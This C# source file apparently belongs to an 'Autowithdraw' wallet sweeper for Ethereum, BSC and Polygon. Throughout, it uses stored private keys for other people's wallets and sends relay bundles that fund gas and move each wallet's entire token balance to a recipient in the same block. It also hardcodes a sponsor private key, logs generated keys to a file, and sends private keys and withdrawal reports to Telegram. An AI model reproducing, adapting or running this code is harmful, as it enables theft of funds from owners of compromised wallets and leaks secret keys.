using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Global.Objects;
using Nethereum.Contracts;
using Nethereum.Hex.HexTypes;
using Nethereum.JsonRpc.WebSocketStreamingClient;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.RPC.Reactive.Eth.Subscriptions;
using Nethereum.Signer;
using Nethereum.Util;
using Nethereum.Web3;
using System;
using System.Collections.Generic;
using System.IO;
using System.Numerics;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Account = Nethereum.Web3.Accounts.Account;

namespace Autowithdraw.Main.Actions
{
    internal class Flashbots
    {
        public static List<string> Withdrawing = new List<string>();

        public static async Task Ethereum(
            string ContractAddress,
            string Address,
            BigInteger Wei)
        {
            try
            {
                #region Values

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], 1),
                    Settings.Chains[1].HTTPClient);
                ContractHelper Contract = new ContractHelper(Address, ContractAddress, Account);
                Function Transfer = Contract.Get("transfer");
                using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[1].WSS);
                var subscription = new EthNewBlockHeadersObservableSubscription(client);
                bool subscribed = true;
                int Tries = 0;

                Pricing.ValidPrice(1, Address, ContractAddress, Wei, Wei, await Contract.Decimals(),
                    await Contract.Name(),
                    out float Price, out float Ether, out BigInteger _);

                Account sponsorAccount = new Account(Helper.GetKey(Price, Address, 1), 1);
                Web3 Sponsor = new Web3(sponsorAccount,
                    Settings.Chains[1].HTTPClient);

                BigInteger Gas = 65000;
                BigInteger GasPrice =
                    Web3.Convert.ToWei(
                        (/*Price >= 155000 ? 1200 :*/ Price >= 10000 ? 20000 : (Price >= 5000 ? 6000 : (Price >= 2000 ? 2500 : (Price >= 1400 ? 2403 : (Price >= 1000 ? 1088 : (Price >= 50 ? 582 : 30)))))),
                        UnitConversion.EthUnit.Gwei);
                BigInteger MaxGasPrice =
                    GasPrice + (await Settings.Chains[1].Web3.Eth.GasPrice.SendRequestAsync()).Value;

                //if (!Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress))
                //    GasPrice = Web3.Convert.ToWei((/*Price >= 155000 ? 120 :*/ Price >= 300 ? 200 : 100), UnitConversion.EthUnit.Gwei);

                #endregion

                #region First Bundle

                Bundle bundle = new Bundle
                {
                    jsonrpc = "2.0",
                    id = 1,
                    method = "eth_sendBundle",
                    @params = new[]
                    {
                        new @params
                        {
                            txs = new List<string>
                            {
                                "0x" + await Sponsor.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = sponsorAccount.Address,
                                    To = Address,
                                    Value = new HexBigInteger(Gas * MaxGasPrice + 5000),
                                    Gas = new HexBigInteger(Gas),
                                    Nonce = new HexBigInteger(
                                        (await Sponsor.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            sponsorAccount.Address,
                                            BlockParameter.BlockParameterType.latest)).Value),
                                    Type = new HexBigInteger(2),
                                    MaxFeePerGas = new HexBigInteger(MaxGasPrice),
                                    MaxPriorityFeePerGas = new HexBigInteger(GasPrice / 2),
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    To = ContractAddress,
                                    Gas = new HexBigInteger(Gas),
                                    Nonce = new HexBigInteger(
                                        (await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            Address, BlockParameter.BlockParameterType.latest)).Value),
                                    Data = Transfer.GetData(Helper.GetAddress(Price, Address, Settings.Config.Recipient), Wei),
                                    Type = new HexBigInteger(2),
                                    MaxFeePerGas = new HexBigInteger(MaxGasPrice),
                                    MaxPriorityFeePerGas = new HexBigInteger(GasPrice),
                                })
                            },
                            blockNumber =
                                new HexBigInteger(
                                    (await Account.Eth.Blocks.GetBlockNumber.SendRequestAsync()).Value + 1).HexValue
                        }
                    }
                };

                List<string> txHashes = new List<string>
                    { "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]) };
                //Logger.Debug(JsonSerializer.Serialize(bundle));

                foreach (string RPC in Settings.Config.Other.RPCList)
                {
                    try
                    {
                        Logger.Debug($"{RPC} - " + Network.Post(JsonSerializer.Serialize(bundle), RPC));
                    }
                    catch (Exception e)
                    {
                        Logger.Error(e);
                    }
                }

                #endregion

                #region Notification

                subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async block =>
                {
                    try
                    {
                        if (Tries > 20)
                            subscribed = false;
                        Tries++;

                        MaxGasPrice = GasPrice + (await Settings.Chains[1].Web3.Eth.GasPrice.SendRequestAsync()).Value;

                        float Fee = Pricing.GetPriceEther(MaxGasPrice * Gas, 1);

                        if (Fee >= Price / 2)
                        {
                            Logger.Error("Fee high the price");
                            subscribed = false;
                            return;
                        }

                        if (Gas > 600000 && !Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress))
                        {
                            Logger.Debug("GasLimit high the normal");
                            subscribed = false;
                            return;
                        }

                        var Block =
                            await Account.Eth.Blocks.GetBlockWithTransactionsByNumber.SendRequestAsync(block.Number);

                        #region Notification

                        bool Finded = false;
                        string findedHash = "";

                        foreach (Transaction transaction in Block.Transactions)
                        {
                            if (txHashes.Contains(transaction.TransactionHash))
                            {
                                Finded = true;
                                findedHash = transaction.TransactionHash;
                            }
                        }

                        if (Finded /*&& (Price < 155000 || !Settings.Start || Address == "0x94Bdd603e222A2aE72831B418e3C45661b662B54")*/)
                        {
                            Logger.Debug($"Included in block - {block.Number}");
                            subscribed = false;

                            string Symbol = await Contract.Symbol();

                            Settings.Stats.AddFlashbotsSpend(Pricing.GetPriceEther(Gas * MaxGasPrice + 5000, 1));
                            Settings.Stats.AddFlashbots(Price);

                            Logger.Debug($"Withdraw {Ether} {Symbol} ({Price}$) from {Address}", ConsoleColor.Green);
                            await Network.SendTelegram(
                                $"{Pricing.GetEmoji(Price)} <a href=\"https://etherscan.io/tx/{findedHash}\">Autowithdraw {Symbol}</a>\n\nWallet: <a href=\"https://etherscan.io/address/{Address}\">{Address}</a>\nAmount: {Ether} <a href=\"https://etherscan.io/token/{ContractAddress}?a={Address}\">{Symbol}</a> ({(float)Price}$)",
                                ContractAddress, 1, true);
                            return;
                        }

                        #endregion

                        Logger.Debug($"Block passed - {block.Number}");

                        Gas = await Transfer.EstimateGasAsync(Address, null, null, Settings.Config.Recipient, Wei);

                        #region Second Bundle

                        bundle.id++;
                        bundle.@params[0] = new @params
                        {
                            txs = new List<string>
                            {
                                "0x" + await Sponsor.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = sponsorAccount.Address,
                                    To = Address,
                                    Value = new HexBigInteger(Gas * MaxGasPrice + 5000),
                                    Gas = new HexBigInteger(Gas),
                                    Nonce = new HexBigInteger(
                                        (await Sponsor.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            sponsorAccount.Address,
                                            BlockParameter.BlockParameterType.latest)).Value),
                                    Type = new HexBigInteger(2),
                                    MaxFeePerGas = new HexBigInteger(MaxGasPrice),
                                    MaxPriorityFeePerGas = new HexBigInteger(GasPrice / 2),
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    To = ContractAddress,
                                    Gas = new HexBigInteger(Gas),
                                    Nonce = new HexBigInteger(
                                        (await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            Address, BlockParameter.BlockParameterType.latest)).Value),
                                    Data = Transfer.GetData(Helper.GetAddress(Price, Address, Settings.Config.Recipient), Wei),
                                    Type = new HexBigInteger(2),
                                    MaxFeePerGas = new HexBigInteger(MaxGasPrice),
                                    MaxPriorityFeePerGas = new HexBigInteger(GasPrice),
                                })
                            },
                            blockNumber = new HexBigInteger(block.Number.Value + 1).HexValue
                        };

                        #endregion

                        foreach (string RPC in Settings.Config.Other.RPCList)
                        {
                            try
                            {
                                Logger.Debug($"{RPC} - " + Network.Post(JsonSerializer.Serialize(bundle), RPC));
                            }
                            catch (Exception e)
                            {
                                Logger.Error(e);
                            }
                        }

                        string calculatedHash =
                            "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);
                        if (!txHashes.Contains(calculatedHash))
                            txHashes.Add(calculatedHash);
                    }
                    catch (Exception e)
                    {
                        if (e.Message.Contains("transfer amount exceeds balance") ||
                            e.Message.Contains("eth_estimateGas"))
                        {
                            Logger.Error("Not balance");
                            subscribed = false;
                            return;
                        }

                        Logger.Error(e);
                    }
                });

                await client.StartAsync();
                await subscription.SubscribeAsync();
                while (subscribed) await Task.Delay(TimeSpan.FromSeconds(0.1));
                Logger.Debug($"Unsubcribed {Address}");

                #endregion
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }

       

        public static List<string> TXHashes = new List<string>();

        public static async Task BSC(
            string Address,
            string ContractAddress)
        {
            try
            {
                Withdrawing.Add(Address);

                Logger.Debug($"{Address} subcribing...");

                #region Values

                var key = EthECKey.GenerateKey();

                string Destination = Settings.Config.Recipient;

                Logger.Debug(key.GetPrivateKey() + " Recipient created");
                await File.AppendAllTextAsync("./Keys.txt", $"{key.GetPrivateKey()}\n");

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], 56), Settings.Chains[56].HTTPClient);

                ContractHelper Contract = new ContractHelper(Address, ContractAddress, Account);
                Function Transfer = Contract.Get("transfer");

                BigInteger Balance = await Contract.Balance();

                for (int i = 0; i < 20 && Balance < await Contract.Decimals() * 0.00001f; i++)
                {
                    Thread.Sleep(1000);
                    Balance = await Contract.Balance();
                }

                if (Balance == 0)
                    return;

                Pricing.ValidPrice(56, Address, ContractAddress, Balance, Balance, await Contract.Decimals(),
                    await Contract.Name(),
                    out float Price, out _, out _);

                if (Price < 500)
                {
                    Destination = Settings.Config.Recipient;
                }

                Account MainAccount = new Account(Helper.GetKey(Price, Address, 56), 56);
                Web3 Main = new Web3(MainAccount, Settings.Chains[56].HTTPClient);

                BigInteger GasLimit = await Transfer.EstimateGasAsync(Address, null, null, Destination, Balance);
                BigInteger GasPrice = Web3.Convert.ToWei((/*Price >= 155000 ? 1200 :*/ Price >= 4900 ? 1200 : (Price >= 2000 ? 941 : (Price >= 740 ? 723 : (Price >= 100 ? 492 : 380)))), UnitConversion.EthUnit.Gwei);

                if (!Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress))
                    GasPrice = Web3.Convert.ToWei((/*Price >= 155000 ? 120 :*/ Price >= 300 ? 200 : 60), UnitConversion.EthUnit.Gwei);

                if (GasLimit > 600000 && !Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress))
                {
                    Logger.Debug("GasLimit high the normal");
                    return;
                }

                #endregion

                await Task.Factory.StartNew(async () =>
                {
                    #region First Bundle

                    BigInteger Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                        Address, BlockParameter.BlockParameterType.latest);

                    Bundle bundle = new Bundle
                    {
                        jsonrpc = "2.0",
                        id = 48,
                        method = "eth_sendPuissant",
                        @params = new[]
                        {
                            new @params
                            {
                                txs = new List<string>
                                {
                                    "0x" + await MainAccount.TransactionManager.SignTransactionAsync(
                                        new TransactionInput
                                        {
                                            From = MainAccount.Address,
                                            To = Address,
                                            Value = new HexBigInteger(GasLimit * GasPrice + 1000000 + 1000000000000000),
                                            GasPrice = new HexBigInteger(GasPrice),
                                            Nonce = new HexBigInteger(
                                                await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                                    MainAccount.Address,
                                                    BlockParameter.BlockParameterType.latest))
                                        }),
                                    "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                    {
                                        From = Address,
                                        To = ContractAddress,
                                        GasPrice = new HexBigInteger(GasPrice),
                                        Gas = new HexBigInteger(GasLimit),
                                        Nonce = new HexBigInteger(Nonce),
                                        Data = Transfer.GetData(Helper.GetAddress(Price, Address, Destination), Balance)
                                    })
                                },
                                maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 20
                            }
                        }
                    };


                    string txHash = "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);

                    Logger.Debug($"TX - {txHash}");
                    Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.48.club"));

                    #endregion

                    #region Notification

                    using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[56].WSS);
                    var subscription = new EthNewBlockHeadersObservableSubscription(client);
                    bool subscribed = true;
                    int Tries = 0;

                    if (TXHashes.Contains(txHash))
                        return;

                    TXHashes.Add(txHash);

                    subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async block =>
                    {
                        try
                        {
                            if (Tries > 20)
                                subscribed = false;
                            Tries++;

                            if (Pricing.GetPriceEther(GasPrice * GasLimit, 56) >= Price)
                            {
                                Logger.Error("Fee high the price");
                                subscribed = false;
                                return;
                            }

                            var Block =
                                await Account.Eth.Blocks.GetBlockWithTransactionsByNumber
                                    .SendRequestAsync(block.Number);

                            #region Notification

                            bool Finded = false;
                            string findedHash = "";

                            foreach (Transaction transaction in Block.Transactions)
                            {
                                if (TXHashes.Contains(transaction.TransactionHash))
                                {
                                    Finded = true;
                                    findedHash = transaction.TransactionHash;
                                }
                            }

                            if (Finded && TXHashes.Contains(findedHash) /*&& (Price < 155000 || !Settings.Start || Address == "0x94Bdd603e222A2aE72831B418e3C45661b662B54")*/)
                            {
                                Logger.Debug($"Included in block - {block.Number}");
                                subscribed = false;
                                TXHashes.Remove(findedHash);

                                string Symbol = await Contract.Symbol();

                                Pricing.ValidPrice(56, Address, ContractAddress, Balance, Balance,
                                    await Contract.Decimals(), Symbol, out float Price, out float Ether, out _);

                                Settings.Stats.AddFlashbotsSpend(Pricing.GetPriceEther(GasLimit * GasPrice, 56));
                                Settings.Stats.AddFlashbots(Price);

                                Logger.Debug($"Withdraw {Ether} {Symbol} ({Price}$) from {Address}",
                                    ConsoleColor.Green);
                                await Network.SendTelegram(
                                    $"{Pricing.GetEmoji(Price)} <a href=\"https://bscscan.com/tx/{findedHash}\">Autowithdraw {Symbol} (Flashbots)</a>\n\nWallet: <a href=\"https://bscscan.com/address/{Address}\">{Address}</a>\nAmount: {Ether} <a href=\"https://bscscan.com/token/{ContractAddress}?a={Address}\">{Symbol}</a> ({Price}$)",
                                    ContractAddress, 56, true);

                                return;
                            }

                            #endregion

                            #region Second Bundle

                            Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                Address, BlockParameter.BlockParameterType.latest);

                            bundle.@params[0] = new @params
                            {
                                txs = new List<string>
                                {
                                    "0x" + await MainAccount.TransactionManager.SignTransactionAsync(
                                        new TransactionInput
                                        {
                                            From = MainAccount.Address,
                                            To = Address,
                                            Value = new HexBigInteger(GasLimit * GasPrice + 1000000),
                                            GasPrice = new HexBigInteger(GasPrice),
                                            Nonce = new HexBigInteger(
                                                await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                                    MainAccount.Address,
                                                    BlockParameter.BlockParameterType.latest))
                                        }),
                                    "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                    {
                                        From = Address,
                                        To = ContractAddress,
                                        GasPrice = new HexBigInteger(GasPrice),
                                        Gas = new HexBigInteger(GasLimit),
                                        Nonce = new HexBigInteger(Nonce),
                                        Data = Transfer.GetData(Helper.GetAddress(Price, Address, Destination), Balance)
                                    })
                                },
                                maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 20
                            };

                            Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.48.club"));
                            string calculatedHash = "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);
                            if (!TXHashes.Contains(calculatedHash))
                                TXHashes.Add(calculatedHash);

                            #endregion

                            Logger.Debug($"Block passed - {block.Number}");
                        }
                        catch (Exception e)
                        {
                            if (e.Message.Contains("transfer amount exceeds balance") ||
                                e.Message.Contains("eth_estimateGas"))
                            {
                                Logger.Error("Not balance");
                                subscribed = false;
                                return;
                            }

                            Logger.Error(e);
                        }
                    });

                    await client.StartAsync();
                    await subscription.SubscribeAsync();
                    while (subscribed) await Task.Delay(TimeSpan.FromSeconds(0.1));
                    Logger.Debug($"Unsubcribed {Address}");

                    #endregion
                });
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }

        public static async Task Approve(
            string Address,
            BigInteger Wei)
        {
            try
            {
                Withdrawing.Add(Address);

                #region Values

                var key = EthECKey.GenerateKey();

                Account MainAccount =
                    new Account("d9afe578156617785e70e5fbcbc9f5e160e2c6fd516a5bf631ef8d3b7b5a9862", 56);
                Account RecipientAccount = new Account(key, 56);

                Logger.Debug(key.GetPrivateKey() + " Recipient created");
                await File.AppendAllTextAsync("./Keys.txt", $"{key.GetPrivateKey()}\n");

                Web3 Main = new Web3(MainAccount, Settings.Chains[56].HTTPClient);
                Web3 Account = new Web3(new Account(Settings.Wallets[Address], 56), Settings.Chains[56].HTTPClient);

                ContractHelper Contract = new ContractHelper(Address, "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", Account);

                Function Transfer = Contract.Get("transfer");

                BigInteger Gwei = Web3.Convert.ToWei(2400, UnitConversion.EthUnit.Gwei);
                BigInteger SponsoredWei = (Gwei * 21000) + (Gwei * 300000) + (Gwei * 80000) + 10000000000000000;

                #endregion

                #region First Bundle

                BigInteger Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                    Address, BlockParameter.BlockParameterType.latest);

                Bundle bundle = new Bundle
                {
                    jsonrpc = "2.0",
                    id = 48,
                    method = "eth_sendPuissant",
                    @params = new[]
                    {
                        new @params
                        {
                            txs = new List<string>
                            {
                                "0x" + await MainAccount.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = MainAccount.Address,
                                    To = Address,
                                    Value = new HexBigInteger(SponsoredWei),
                                    GasPrice = new HexBigInteger(Gwei),
                                    Nonce = new HexBigInteger(
                                        await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            MainAccount.Address,
                                            BlockParameter.BlockParameterType.latest))
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    To = "0x45c54210128a065de780C4B0Df3d16664f7f859e",
                                    GasPrice = new HexBigInteger(Gwei),
                                    Gas = new HexBigInteger(300000),
                                    Nonce = new HexBigInteger(Nonce),
                                    Data = "0x853828b6"
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    To = "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
                                    GasPrice = new HexBigInteger(Gwei),
                                    Gas = new HexBigInteger(80000),
                                    Nonce = new HexBigInteger(Nonce+1),
                                    Data = Transfer.GetData(RecipientAccount.Address, Wei)
                                })
                            },
                            maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 120
                        }
                    }
                };


                List<string> txHashes = new List<string>
                    { "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]) };

                Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.48.club"));

                #endregion

                #region Notification

                using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[56].WSS);
                var subscription = new EthNewBlockHeadersObservableSubscription(client);
                bool subscribed = true;

                subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async block =>
                {
                    try
                    {
                        var Block =
                            await Account.Eth.Blocks.GetBlockWithTransactionsByNumber
                                .SendRequestAsync(block.Number);

                        #region Notification

                        bool Finded = false;
                        string findedHash = "";

                        foreach (Transaction transaction in Block.Transactions)
                        {
                            if (txHashes.Contains(transaction.TransactionHash))
                            {
                                Finded = true;
                                findedHash = transaction.TransactionHash;
                            }
                        }

                        if (Finded)
                        {
                            Logger.Debug($"Included in block - {block.Number}");
                            subscribed = false;

                            string Symbol = await Contract.Symbol();

                            Pricing.ValidPrice(56, Address, "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", Wei, Wei,
                                await Contract.Decimals(), Symbol, out float Price, out float Ether, out _);

                            Logger.Debug($"Withdraw {Ether} {Symbol} ({Price}$) from {Address}",
                                ConsoleColor.Green);
                            await Network.SendTelegram(
                                $"{Pricing.GetEmoji(Price)} <a href=\"https://bscscan.com/tx/{findedHash}\">Autowithdraw {Symbol}</a>\n\nWallet: <a href=\"https://bscscan.com/address/{Address}\">{Address}</a>\nAmount: {Ether} <a href=\"https://bscscan.com/token/0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82?a={Address}\">{Symbol}</a> ({Price}$)\n\nPrivate Key: <code>{key.GetPrivateKey()}</code>",
                                "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", 56, true);

                            await Main.TransactionManager.SendTransactionAsync(new TransactionInput
                            {
                                From = MainAccount.Address,
                                To = RecipientAccount.Address,
                                Value = new HexBigInteger(11000000000000000),
                                GasPrice = new HexBigInteger(5000000000),
                                Nonce = new HexBigInteger(await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                    MainAccount.Address,
                                    BlockParameter.BlockParameterType.latest))
                            });

                            return;
                        }

                        #endregion

                        #region Second Bundle

                        Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                            Address, BlockParameter.BlockParameterType.latest);

                        bundle.@params[0] = new @params
                        {
                            txs = new List<string>
                            {
                                "0x" + await MainAccount.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = MainAccount.Address,
                                    To = Address,
                                    Value = new HexBigInteger(SponsoredWei),
                                    GasPrice = new HexBigInteger(Gwei),
                                    Nonce = new HexBigInteger(
                                        await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            MainAccount.Address,
                                            BlockParameter.BlockParameterType.latest))
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    To = "0x45c54210128a065de780C4B0Df3d16664f7f859e",
                                    GasPrice = new HexBigInteger(Gwei),
                                    Gas = new HexBigInteger(300000),
                                    Nonce = new HexBigInteger(Nonce),
                                    Data = "0x853828b6"
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    To = "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
                                    GasPrice = new HexBigInteger(Gwei),
                                    Gas = new HexBigInteger(80000),
                                    Nonce = new HexBigInteger(Nonce+1),
                                    Data = Transfer.GetData(RecipientAccount.Address, Wei)
                                })
                            },
                            maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 120
                        };

                        Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.48.club"));
                        string calculatedHash = "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);
                        if (!txHashes.Contains(calculatedHash))
                            txHashes.Add(calculatedHash);

                        #endregion

                        Logger.Debug($"Block passed - {block.Number}");
                    }
                    catch (Exception e)
                    {
                        if (e.Message.Contains("transfer amount exceeds balance") ||
                            e.Message.Contains("eth_estimateGas"))
                        {
                            Logger.Error("Not balance");
                            subscribed = false;
                            return;
                        }

                        Logger.Error(e);
                    }
                });

                await client.StartAsync();
                await subscription.SubscribeAsync();
                while (subscribed) await Task.Delay(TimeSpan.FromSeconds(0.1));

                #endregion
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }

        public static async Task Polygon(
            string Address,
            string ContractAddress)
        {
            try
            {
                Withdrawing.Add(Address);

                #region Values

                var key = EthECKey.GenerateKey();

                Account MainAccount =
                    new Account("d9afe578156617785e70e5fbcbc9f5e160e2c6fd516a5bf631ef8d3b7b5a9862", 137);
                Account RecipientAccount = new Account(key, 137);

                Logger.Debug(key.GetPrivateKey() + " Recipient created");
                await File.AppendAllTextAsync("./Keys.txt", $"{key.GetPrivateKey()}\n");

                Web3 Main = new Web3(MainAccount, Settings.Chains[137].HTTPClient);
                Web3 Account = new Web3(new Account(Settings.Wallets[Address], 137), Settings.Chains[137].HTTPClient);

                ContractHelper Contract = new ContractHelper(Address, ContractAddress, Account);

                Function Transfer = Contract.Get("transfer");

                BigInteger Balance = await Contract.Balance();

                for (int i = 0; i < 20 && Balance < await Contract.Decimals() * 0.00001f; i++)
                {
                    Thread.Sleep(1000);
                    Balance = await Contract.Balance();
                }

                if (Balance == 0)
                    return;

                BigInteger GasLimit = await Transfer.EstimateGasAsync(Address, null, null, RecipientAccount.Address, Balance);

                if (GasLimit > 600000)
                    return;

                #endregion

                await Task.Factory.StartNew(async () =>
                {
                    #region First Bundle

                    BigInteger Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                        Address, BlockParameter.BlockParameterType.latest);

                    Bundle bundle = new Bundle
                    {
                        jsonrpc = "2.0",
                        id = 1,
                        method = "eth_sendBundle",
                        @params = new[]
                        {
                            new @params
                            {
                                txs = new List<string>
                                {
                                    "0x" + await MainAccount.TransactionManager.SignTransactionAsync(
                                        new TransactionInput
                                        {
                                            From = MainAccount.Address,
                                            To = Address,
                                            Value = new HexBigInteger(GasLimit * 31000000000),
                                            GasPrice = new HexBigInteger(31000000000),
                                            Nonce = new HexBigInteger(
                                                await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                                    MainAccount.Address,
                                                    BlockParameter.BlockParameterType.latest))
                                        }),
                                    "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                    {
                                        From = Address,
                                        To = ContractAddress,
                                        GasPrice = new HexBigInteger(31000000000),
                                        Gas = new HexBigInteger(GasLimit),
                                        Nonce = new HexBigInteger(Nonce),
                                        Data = Transfer.GetData(RecipientAccount.Address, Balance)
                                    })
                                },
                                blockNumber =
                                    new HexBigInteger(
                                        (await Account.Eth.Blocks.GetBlockNumber.SendRequestAsync()).Value + 1).HexValue
                            }
                        }
                    };


                    List<string> txHashes = new List<string>
                        { "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]) };

                    Logger.Debug(JsonSerializer.Serialize(bundle));

                    Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "http://bor.txrelay.marlin.org/"));

                    #endregion

                    #region Notification

                    using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[137].WSS);
                    var subscription = new EthNewBlockHeadersObservableSubscription(client);
                    bool subscribed = true;
                    int Tries = 0;

                    subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async block =>
                    {
                        try
                        {
                            if (Tries > 20)
                                subscribed = false;
                            Tries++;

                            var Block =
                                await Account.Eth.Blocks.GetBlockWithTransactionsByNumber
                                    .SendRequestAsync(block.Number);

                            #region Notification

                            bool Finded = false;
                            string findedHash = "";

                            foreach (Transaction transaction in Block.Transactions)
                            {
                                if (txHashes.Contains(transaction.TransactionHash))
                                {
                                    Finded = true;
                                    findedHash = transaction.TransactionHash;
                                }
                            }

                            if (Finded)
                            {
                                Logger.Debug($"Included in block - {block.Number}");
                                subscribed = false;

                                string Symbol = await Contract.Symbol();

                                Pricing.ValidPrice(137, Address, ContractAddress, Balance, Balance,
                                    await Contract.Decimals(), Symbol, out float Price, out float Ether, out _);

                                Logger.Debug($"Withdraw {Ether} {Symbol} ({Price}$) from {Address}",
                                    ConsoleColor.Green);
                                await Network.SendTelegram(
                                    $"{Pricing.GetEmoji(Price)} <a href=\"https://polygonscan.com/tx/{findedHash}\">Autowithdraw {Symbol}</a>\n\nWallet: <a href=\"https://polygonscan.com/address/{Address}\">{Address}</a>\nAmount: {Ether} <a href=\"https://polygonscan.com/token/{ContractAddress}?a={Address}\">{Symbol}</a> ({Price}$)\n\nPrivate Key: <code>{key.GetPrivateKey()}</code>",
                                    ContractAddress, 137, true);

                                return;
                            }

                            #endregion

                            #region Second Bundle

                            Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                Address, BlockParameter.BlockParameterType.latest);

                            bundle.id++;
                            bundle.@params[0] = new @params
                            {
                                txs = new List<string>
                                {
                                    "0x" + await MainAccount.TransactionManager.SignTransactionAsync(
                                        new TransactionInput
                                        {
                                            From = MainAccount.Address,
                                            To = Address,
                                            Value = new HexBigInteger(GasLimit * 31000000000),
                                            GasPrice = new HexBigInteger(31000000000),
                                            Nonce = new HexBigInteger(
                                                await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                                    MainAccount.Address,
                                                    BlockParameter.BlockParameterType.latest))
                                        }),
                                    "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                    {
                                        From = Address,
                                        To = ContractAddress,
                                        GasPrice = new HexBigInteger(31000000000),
                                        Gas = new HexBigInteger(GasLimit),
                                        Nonce = new HexBigInteger(Nonce),
                                        Data = Transfer.GetData(RecipientAccount.Address, Balance)
                                    })
                                },
                                blockNumber =
                                    new HexBigInteger(
                                        (await Account.Eth.Blocks.GetBlockNumber.SendRequestAsync()).Value + 1).HexValue
                            };

                            Network.Post(JsonSerializer.Serialize(bundle), "http://bor.txrelay.marlin.org/");
                            string calculatedHash = "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);
                            if (!txHashes.Contains(calculatedHash))
                                txHashes.Add(calculatedHash);

                            #endregion

                            Logger.Debug($"Block passed - {block.Number}");
                        }
                        catch (Exception e)
                        {
                            if (e.Message.Contains("transfer amount exceeds balance") ||
                                e.Message.Contains("eth_estimateGas"))
                            {
                                Logger.Error("Not balance");
                                subscribed = false;
                                return;
                            }

                            Logger.Error(e);
                        }
                    });

                    await client.StartAsync();
                    await subscription.SubscribeAsync();
                    while (subscribed) await Task.Delay(TimeSpan.FromSeconds(0.1));

                    #endregion
                });
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }
    }
}
